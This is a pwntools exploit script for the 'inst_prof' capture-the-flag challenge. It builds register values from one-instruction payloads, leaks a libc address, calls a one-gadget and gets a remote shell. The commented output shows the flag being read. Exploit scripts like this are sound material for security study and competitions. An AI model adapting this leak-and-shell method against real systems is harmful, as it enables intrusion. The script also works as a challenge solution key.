#!/usr/bin/env python2
# -*- coding: utf-8 -*-
from pwn import *

context(arch='amd64', os='linux')

# by Francesco Cagnin, Marco Gasparini


def assemble(code):
    return asm(code).ljust(4, '\x90')


def set_reg(reg, imm, tmp_reg):
    instructions = []
    instructions.append('xor {tmp_reg:}, {tmp_reg:}; ret')
    instructions.append('inc {tmp_reg:}; ret')
    instructions.append('xor {reg:}, {reg:}; ret')

    while imm:
        if imm & 1:
            instructions.append('xor {reg:}, {tmp_reg:}; ret')
        instructions.append('add {tmp_reg:}, {tmp_reg:}; ret')
        imm >>= 1

    return [inst.format(reg=reg, tmp_reg=tmp_reg) for inst in instructions]


io = remote('inst-prof.ctfcompetition.com', 1337)
io.recvuntil('initializing prof...ready\n')

# leak a libc address from rsp+0x40 into r14
for inst in set_reg('r15', 0x40, 'r13'):
    io.send(assemble(inst))
io.send(assemble('mov r14, [rsp+r15]'))

# set r14 to libc base address
for inst in set_reg('r15', 0x21f45, 'r13'):
    io.send(assemble(inst))
io.send(assemble('sub r14, r15; ret'))

# call libc one-gadget
for inst in set_reg('r15', 0xe8fd5, 'r13'):
    io.send(assemble(inst))
io.send(assemble('add r14, r15; ret'))
io.send(assemble('call r14; ret'))

io.interactive()

# $ ./inst_prof.py
# [+] Opening connection to inst-prof.ctfcompetition.com on port 1337: Done
# [*] Switching to interactive mode
# �\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00z\x00\x00\x00\x00\x00\x00\x00\xbe\x00\x00\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00\x93\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\x95\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x006\x10\x00\x00\x00\x00\x00\x00\x81\x00\x00\x00\x00\x00\x00Z\x00\x00\x00\x00\x00\x00}\x00\x00\x00\x00\x00\x00\x00t\x00\x00\x00\x00\x00\x00q\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00T\x00\x00\x00\x00\x00\x00\xbd\x00\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00E\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00T\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00i\x00\x00\x00\x00\x00\x00\\x00\x00\x00\x00\x00\x00b\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00g\x00\x00\x00\x00\x00\x00g\x00\x00\x00\x00\x00\x00]\x00\x00\x00\x00\x00\x00q\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\xb5\x00\x00\x00\x00\x00\x00\xb5\x00\x00\x00\x00\x00\x00s\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\xbf\x00\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00\x87\x00\x00\x00\x00\x00\x00\x00\x97\x00\x00\x00\x00\x00\x00\x00z\x00\x00\x00\x00\x00\x00\x00\xbc\x00\x00\x00\x00\x00\x00O\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00\x85\x00\x00\x00\x00\x00\x00\x00_\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\xad\x00\x00\x00\x00\x00\x00\x84\x00\x00\x00\x00\x00\x00\x00\xa4\x00\x00\x00\x00\x00\x00�\x00\x00\x00�\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00W\x00\x00\x00\x00\x00\x00\x85\x00\x00\x00\x00\x00\x00\x00Z\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x8a\x00\x00\x00\x00\x00\x00\x00�\x00\x00\x00Z\x00\x00\x00\x00\x00\x00j\x00\x00\x00\x00\x00\x00B\x00\x00\x00\x00\x00\x00\x82\x00\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00�\x00\x00\x00\x00\x00\x00$ ls
# flag.txt
# inst_prof
# $ cat flag.txt
# CTF{0v3r_4ND_0v3r_4ND_0v3r_4ND_0v3r}
